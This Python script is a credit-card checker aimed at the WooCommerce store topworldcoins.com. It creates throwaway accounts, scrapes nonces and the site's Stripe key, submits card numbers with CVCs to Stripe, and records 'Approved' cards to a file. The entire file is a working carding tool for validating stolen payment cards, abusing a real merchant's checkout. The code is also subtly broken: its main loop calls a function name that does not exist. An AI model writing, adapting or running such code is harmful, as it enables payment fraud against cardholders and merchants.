import requests
import re
import random
import uuid
import time
import json
from user_agent import generate_user_agent

user = generate_user_agent()
r = requests.Session()

def Stripe3(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3].strip()
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    link = "https://topworldcoins.com"
    
    # ===== 1. جلب صفحة التسجيل =====
    headers = {
        'authority': 'topworldcoins.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'referer': 'https://topworldcoins.com/my-account/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    response = r.get(f'{link}/my-account/', headers=headers)
    reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text)
    if not reg:
        return 'Register nonce not found ❌'
    reg = reg.group(1)
    
    # ===== 2. تسجيل حساب جديد =====
    headers = {
        'authority': 'topworldcoins.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://topworldcoins.com',
        'referer': 'https://topworldcoins.com/my-account/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    email = f"u_{uuid.uuid4().hex[:8]}@gmail.com"
    username = f"u_{uuid.uuid4().hex[:8]}"
    password = f"P_{uuid.uuid4().hex[:8]}!"
    
    data = {
        'username': username,
        'email': email,
        'password': password,
        'woocommerce-register-nonce': reg,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }
    
    r.post(f'{link}/my-account/', cookies=r.cookies, headers=headers, data=data)
    
    # ===== 3. فتح صفحة إضافة البطاقة =====
    headers = {
        'authority': 'topworldcoins.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'referer': 'https://topworldcoins.com/my-account/payment-methods/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    response = r.get(f'{link}/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
    
    # استخراج pk_live
    pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', response.text)
    if not pk_live:
        pk_live = re.search(r'(pk_test_[A-Za-z0-9_-]+)', response.text)
    if not pk_live:
        return 'Stripe key not found ❌'
    pk_live = pk_live.group(1)
    
    # استخراج nonce
    addnonce = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response.text)
    if not addnonce:
        addnonce = re.search(r'"createSetupIntentNonce":"(.*?)"', response.text)
    if not addnonce:
        addnonce = re.search(r'"add_card_nonce":"(.*?)"', response.text)
    if not addnonce:
        all_nonces = re.findall(r'nonce["\']?\s*[:=]\s*["\']([a-f0-9]{10})["\']', response.text)
        if all_nonces:
            addnonce = all_nonces[0]
        else:
            return 'Nonce not found ❌'
    else:
        addnonce = addnonce.group(1)
    
    # استخراج stripe_account
    stripe_account = re.search(r'(acct_[A-Za-z0-9_-]+)', response.text)
    acct = f'&_stripe_account={stripe_account.group(1)}' if stripe_account else ''
    
    # ===== 4. جلب معرفات Stripe =====
    headers = {
        'authority': 'm.stripe.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'text/plain;charset=UTF-8',
        'origin': 'https://m.stripe.network',
        'referer': 'https://m.stripe.network/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    response = r.post('https://m.stripe.com/6', cookies=r.cookies, headers=headers, data='')
    detet = response.json()
    guid = detet.get('guid', str(uuid.uuid4()))
    muid = detet.get('muid', str(uuid.uuid4()))
    sid = detet.get('sid', str(uuid.uuid4()))
    
    client_session_id = str(uuid.uuid4())
    elements_session_config_id = str(uuid.uuid4())
    times = random.randint(10000, 99999)
    
    # ===== 5. إنشاء Payment Method =====
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10090&billing_details[address][country]=US&billing_details[name]=+&billing_details[email]={email}&payment_user_agent=stripe.js%2F8da149ee39%3B+stripe-js-v3%2F8da149ee39%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ftopworldcoins.com&time_on_page={times}&client_attribution_metadata[client_session_id]={client_session_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]={elements_session_config_id}&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid={guid}&muid={muid}&sid={sid}&key={pk_live}{acct}&_stripe_version=2024-06-20'
    
    response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    
    if 'id' not in response.json():
        error_msg = response.json().get('error', {}).get('message', 'Unknown error')
        return f'Payment method creation failed: {error_msg} ❌'
    payment_id = response.json()['id']
    
    # ===== 6. تأكيد Setup Intent =====
    headers = {
        'authority': 'topworldcoins.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://topworldcoins.com',
        'referer': 'https://topworldcoins.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    # تجربة actions مختلفة
    actions = ['create_setup_intent', 'wc_stripe_create_and_confirm_setup_intent']
    
    for action in actions:
        data = {
            'action': action,
            'wcpay-payment-method': payment_id if action == 'create_setup_intent' else payment_id,
            '_ajax_nonce': addnonce,
            'wcpay-fraud-prevention-token': '',
        }
        
        if action == 'wc_stripe_create_and_confirm_setup_intent':
            data = {
                'action': action,
                'wc-stripe-payment-method': payment_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': addnonce,
            }
        
        response = r.post(f'{link}/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
        text = response.text
        
        if text != '0' and 'error' not in text.lower():
            break
    
    # ===== تحليل النتيجة =====
    try:
        json_res = json.loads(text)
        if json_res.get('success') == True:
            return 'Approved ✅'
        else:
            error_msg = json_res.get('data', {}).get('error', {}).get('message', 'Unknown error')
            if 'declined' in error_msg.lower() or 'not able to add' in error_msg.lower():
                return 'Declined ❌'
            elif 'incorrect' in error_msg.lower():
                return 'Card number is incorrect ❌'
            elif 'duplicate' in error_msg.lower():
                return 'Approved (Duplicate) ✅'
            else:
                return f'Declined ❌: {error_msg}'
    except:
        if 'card was declined' in text.lower() or 'Your card could not be set up' in text:
            return 'The card was declined ❌'
        elif 'Your card number is incorrect.' in text:
            return 'Card number is incorrect ❌'
        elif 'success' in text.lower() or '"success":true' in text:
            return 'Approved ✅'
        elif 'duplicate' in text.lower():
            return 'Approved (Duplicate) ✅'
        elif text == '0':
            return 'Nonce expired or invalid ❌'
        else:
            return f'Unknown: {text[:50]}'


if __name__ == '__main__':
    Getat = 'Stripe Auth - https://topworldcoins.com'
    print(f'Checker {Getat}')
    print("="*60)
    
    while True:
        try:
            card_input = input('\nEnter Card (n|mm|yy|cvc): ')
            if not card_input:
                continue
            result = B11HB(card_input)
            print(f'Result: {result}')
            
            if 'Approved' in result:
                with open('Approved Card.txt', "a") as f:
                    f.write(card_input + f': {result} > {Getat}\n')
            
            time.sleep(3)
        except KeyboardInterrupt:
            print('\nExiting...')
            break
        except Exception as e:
            print(f'Error: {e}')
            time.sleep(2)